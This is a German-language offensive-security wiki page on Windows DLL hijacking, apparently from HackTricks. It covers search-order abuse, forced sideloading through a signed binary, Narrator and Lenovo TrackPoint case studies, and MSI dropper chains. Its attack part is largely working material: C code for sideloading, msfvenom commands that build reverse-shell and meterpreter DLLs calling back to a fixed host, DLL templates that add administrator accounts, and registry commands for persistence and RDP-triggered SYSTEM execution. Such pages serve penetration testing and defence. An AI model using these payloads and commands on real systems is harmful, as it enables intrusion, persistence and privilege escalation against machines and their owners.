# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Grundlegende Informationen

DLL Hijacking beinhaltet, eine vertrauenswürdige Anwendung dazu zu bringen, eine bösartige DLL zu laden. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection, and Side-Loading**. Es wird hauptsächlich für code execution, zum Erreichen von persistence und seltener für privilege escalation verwendet. Trotz des hierigen Fokus auf Escalation bleibt die Methode des Hijackings unabhängig vom Ziel gleich.

### Häufige Techniken

Es werden mehrere Methoden für DLL hijacking eingesetzt, deren Wirksamkeit vom DLL-Ladeverhalten der Anwendung abhängt:

1. **DLL Replacement**: Ersetzen einer echten DLL durch eine bösartige, optional unter Verwendung von DLL Proxying, um die Funktionalität der Original-DLL zu erhalten.
2. **DLL Search Order Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen DLL, Ausnutzen des Suchmusters der Anwendung.
3. **Phantom DLL Hijacking**: Erstellen einer bösartigen DLL, die eine Anwendung lädt, da sie glaubt, es handle sich um eine nicht vorhandene benötigte DLL.
4. **DLL Redirection**: Ändern von Suchparametern wie %PATH% oder .exe.manifest / .exe.local Dateien, um die Anwendung auf die bösartige DLL zu lenken.
5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch eine bösartige Gegenstelle im WinSxS-Verzeichnis, eine Methode, die oft mit DLL side-loading in Verbindung steht.
6. **Relative Path DLL Hijacking**: Platzieren der bösartigen DLL in einem vom Benutzer kontrollierten Verzeichnis zusammen mit der kopierten Anwendung, ähnlich zu Binary Proxy Execution-Techniken.

## Fehlende Dlls finden

Die gebräuchlichste Methode, um fehlende Dlls in einem System zu finden, ist das Ausführen von [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von sysinternals und das **Setzen** der **folgenden 2 Filter**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

und nur die **File System Activity** anzeigen:

![](<../../../images/image (153).png>)

Wenn Sie allgemein nach **missing dlls** suchen, lassen Sie dies für einige **Sekunden** laufen.\
Wenn Sie nach einer **missing dll in einer spezifischen ausführbaren Datei** suchen, sollten Sie einen weiteren Filter wie "Process Name" "contains" `<exec name>` setzen, diese ausführen und dann die Ereigniserfassung stoppen.

## Exploiting Missing Dlls

Um privileges zu escalate, besteht unsere beste Chance darin, eine DLL schreiben zu können, die ein privilegierter Prozess zu laden versucht, an einem Ort, an dem sie gesucht wird. Daher können wir entweder eine DLL in einen Ordner schreiben, in dem die DLL vor dem Ordner mit der original DLL gesucht wird (seltenes Szenario), oder wir schreiben in einen Ordner, in dem die DLL gesucht wird, während die originale DLL in keinem Ordner vorhanden ist.

### Dll Search Order

**In der** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **finden Sie detailliert, wie Dlls geladen werden.**

Windows-Anwendungen suchen nach DLLs, indem sie einem Satz vordefinierter Suchpfade in einer bestimmten Reihenfolge folgen. Das Problem des DLL hijacking entsteht, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, sodass sie vor der authentischen DLL geladen wird. Eine Lösung, um dies zu verhindern, besteht darin, dass die Anwendung absolute Pfade verwendet, wenn sie auf die benötigten DLLs verweist.

Sie können die **DLL search order auf 32-bit** Systemen unten sehen:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Das ist die **Standard**-Suchreihenfolge mit **SafeDllSearchMode** aktiviert. Wenn es deaktiviert ist, rückt das aktuelle Verzeichnis auf den zweiten Platz. Um diese Funktion zu deaktivieren, erstellen Sie den Registry-Wert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setzen ihn auf 0 (Standard ist aktiviert).

Wenn die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) Funktion mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Beachten Sie schließlich, dass **eine dll durch Angabe eines absoluten Pfads geladen werden kann anstatt nur des Namens**. In diesem Fall wird die DLL **nur in diesem Pfad** gesucht (falls die DLL Abhängigkeiten hat, werden diese so gesucht, als wären sie nur nach Name geladen worden).

Es gibt andere Möglichkeiten, die Suchreihenfolge zu verändern, die hier aber nicht erklärt werden.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Ein fortgeschrittener Weg, die DLL-Suchpfade eines neu erstellten Prozesses deterministisch zu beeinflussen, ist das Setzen des DllPath-Feldes in RTL_USER_PROCESS_PARAMETERS beim Erstellen des Prozesses mit den nativen ntdll-APIs. Indem man hier ein vom Angreifer kontrolliertes Verzeichnis angibt, kann ein Zielprozess, der eine importierte DLL nach Name auflöst (kein absoluter Pfad und ohne sichere Ladeflags), gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Kernidee
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Hinweise/Einschränkungen
- Dies betrifft den erstellten Child-Prozess; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess beeinflusst.
- Das Ziel muss eine DLL nach Name importieren oder via LoadLibrary laden (kein absoluter Pfad und nicht unter Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und hartkodierte absolute Pfade können nicht gehijackt werden. Forwarded exports und SxS können die Priorität verändern.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Ausnahmen bei der DLL-Suchreihenfolge aus der Windows-Dokumentation

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Privilegien eskalieren

**Anforderungen**:

- Identifiziere einen Prozess, der unter **anderen Privilegien** läuft oder laufen wird (horizontal or lateral movement) und dem **eine DLL fehlt**.
- Stelle sicher, dass für jedes **Verzeichnis**, in dem nach der **DLL** gesucht wird, **Schreibzugriff** besteht. Dies kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im system path sein.

Ja, die Voraussetzungen sind schwer zu finden, da es standardmäßig ziemlich ungewöhnlich ist, eine privilegierte ausführbare Datei zu finden, der eine DLL fehlt, und es noch ungewöhnlicher ist, Schreibberechtigungen in einem Systempfad-Ordner zu haben (standardmäßig nicht möglich). Aber in fehlkonfigurierten Umgebungen ist das möglich.\
Falls du Glück hast und die Voraussetzungen erfüllst, kannst du dir das [UACME](https://github.com/hfiref0x/UACME) project ansehen. Selbst wenn das **Hauptziel des Projekts das Umgehen von UAC** ist, findest du dort möglicherweise einen **PoC** für ein Dll hijacking der Windows-Version, das du verwenden kannst (wahrscheinlich nur den Pfad des Ordners ändern, in dem du Schreibrechte hast).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **prüfe die Berechtigungen aller Ordner im PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Du kannst auch die imports eines executable und die exports einer dll mit folgendem Befehl prüfen:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für einen vollständigen Leitfaden, wie man **abuse Dll Hijacking to escalate privileges** mit Berechtigungen zum Schreiben in einem **System Path folder** nutzt, siehe:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) wird prüfen, ob du Schreibrechte auf einen Ordner innerhalb des system PATH hast.\
Weitere interessante automatisierte Tools, um diese Schwachstelle zu entdecken, sind **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll_.

### Example

Falls du ein ausnutzbares Szenario findest, ist eine der wichtigsten Maßnahmen, um es erfolgreich auszunutzen, **eine dll zu erstellen, die mindestens alle Funktionen exportiert, die die ausführbare Datei von ihr importiert**. Beachte außerdem, dass Dll Hijacking nützlich ist, um [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) oder von[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** zu erreichen. Ein Beispiel dafür, **wie man eine gültige dll erstellt**, findest du in dieser Studie zum dll hijacking mit Schwerpunkt auf dll hijacking für die Ausführung: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Außerdem findest du im **nächsten Abschnitt** einige **einfache dll-Codes**, die als **Templates** nützlich sein können oder um eine **dll mit nicht benötigten exportierten Funktionen** zu erstellen.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Im Grunde ist ein **Dll proxy** eine Dll, die in der Lage ist, **deinen bösartigen Code beim Laden auszuführen**, aber auch so zu **funktionieren** und sich wie erwartet zu verhalten, indem sie alle Aufrufe an die echte Bibliothek weiterleitet.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du tatsächlich **eine ausführbare Datei angeben und die Bibliothek auswählen**, die du proxifizieren möchtest, und eine **proxified dll** erzeugen oder **die Dll angeben** und eine **proxified dll** generieren.

### **Meterpreter**

**Rev shell erhalten (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Einen meterpreter (x86) erhalten:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Erstelle einen Benutzer (x86, ich habe keine x64-Version gesehen):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Dein eigenes

Beachte, dass in mehreren Fällen die Dll, die du kompilierst, **export several functions**, die vom Opferprozess geladen werden; wenn diese Funktionen nicht existieren, wird die **binary won't be able to load** sie und der **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-Beispiel mit Benutzererstellung</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternative C-DLL mit Thread-Einstieg</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe prüft beim Start weiterhin eine vorhersehbare, sprachspezifische localization DLL, die gehijackt werden kann, um arbitrary code execution und persistence zu erreichen.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC-Stille
- Ein naiver hijack wird UI sprechen/hervorheben. Um still zu bleiben, beim Attach die Narrator-Threads aufzählen, den Hauptthread öffnen (`OpenThread(THREAD_SUSPEND_RESUME)`) und mit `SuspendThread` anhalten; in deinem eigenen Thread fortfahren. Siehe PoC für den vollständigen Code.

Trigger und Persistenz via Accessibility configuration
- Benutzerkontext (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit dem Obigen lädt das Starten von Narrator die abgelegte DLL. Auf dem Secure Desktop (Anmeldebildschirm) STRG+WIN+ENTER drücken, um Narrator zu starten.

RDP-ausgelöste SYSTEM-Ausführung (lateral movement)
- Classic RDP-Sicherheitslayer erlauben: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Per RDP zum Host verbinden, am Anmeldebildschirm STRG+WIN+ENTER drücken, um Narrator zu starten; deine DLL wird als SYSTEM auf dem Secure Desktop ausgeführt.
- Die Ausführung endet, wenn die RDP-Sitzung geschlossen wird — inject/migrate umgehend durchführen.

Bring Your Own Accessibility (BYOA)
- Du kannst einen eingebauten Accessibility Tool (AT)-Registry-Eintrag klonen (z. B. CursorIndicator), ihn so bearbeiten, dass er auf ein beliebiges Binary/DLL zeigt, importieren und dann `configuration` auf diesen AT-Namen setzen. Dadurch lässt sich beliebige Ausführung über das Accessibility-Framework erreichen.

Hinweise
- Schreiben unter `%windir%\System32` und das Ändern von HKLM-Werten erfordert Admin-Rechte.
- Die gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` leben; Exports sind nicht erforderlich.

## Fallstudie: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Dieser Fall demonstriert **Phantom DLL Hijacking** im TrackPoint Quick Menu von Lenovo (`TPQMAssistant.exe`), beobachtet als **CVE-2025-1729**.

### Vulnerability Details

- **Komponente**: `TPQMAssistant.exe` befindet sich unter `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geplanter Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` läuft täglich um 9:30 unter dem Kontext des angemeldeten Benutzers.
- **Verzeichnisberechtigungen**: Schreibbar durch `CREATOR OWNER`, wodurch lokale Benutzer beliebige Dateien ablegen können.
- **DLL-Suchverhalten**: Versucht zuerst, `hostfxr.dll` aus seinem Arbeitsverzeichnis zu laden und protokolliert "NAME NOT FOUND", falls die Datei fehlt, was auf eine Priorität des lokalen Verzeichnisses hinweist.

### Exploit-Implementierung

Ein Angreifer kann einen bösartigen `hostfxr.dll`-Stub im selben Verzeichnis platzieren und die fehlende DLL ausnutzen, um Codeausführung im Kontext des Benutzers zu erreichen:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Angriffsablauf

1. Als Standardbenutzer `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ablegen.
2. Warten, bis die geplante Aufgabe um 09:30 Uhr im Kontext des aktuellen Benutzers ausgeführt wird.
3. Wenn bei Ausführung der Aufgabe ein Administrator angemeldet ist, läuft die bösartige DLL in der Sitzung des Administrators mit mittlerer Integrität.
4. Verkette standard UAC bypass techniques, um von mittlerer Integrität auf SYSTEM-Privilegien zu eskalieren.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Bedrohungsakteure kombinieren häufig MSI-based droppers mit DLL side-loading, um payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.

Chain overview
- User downloads MSI. A CustomAction runs silently during the GUI install (e.g., LaunchApplication or a VBScript action), reconstructing the next stage from embedded resources.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Look for multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktisches sideloading mit wsc_proxy.exe
- Lege diese beiden Dateien in denselben Ordner:
- wsc_proxy.exe: legitim signierter Host (Avast). Der Prozess versucht, wsc.dll unter dem Namen aus seinem Verzeichnis zu laden.
- wsc.dll: attacker DLL. Falls keine spezifischen Exportfunktionen erforderlich sind, reicht DllMain aus; andernfalls erstelle eine proxy DLL und leite die benötigten Exporte an die echte Bibliothek weiter, während du den payload in DllMain ausführst.
- Erstelle ein minimales DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Für Export-Anforderungen verwenden Sie ein proxying framework (z. B. DLLirant/Spartacus), um eine forwarding DLL zu erzeugen, die außerdem Ihren payload ausführt.

- Diese Technik beruht auf DLL name resolution durch das host binary. Wenn der Host absolute Pfade oder sichere Lade-Flags verwendet (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann der hijack fehlschlagen.
- KnownDLLs, SxS und forwarded exports können die precedence beeinflussen und müssen bei der Auswahl des host binary und des export set berücksichtigt werden.

## Referenzen

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
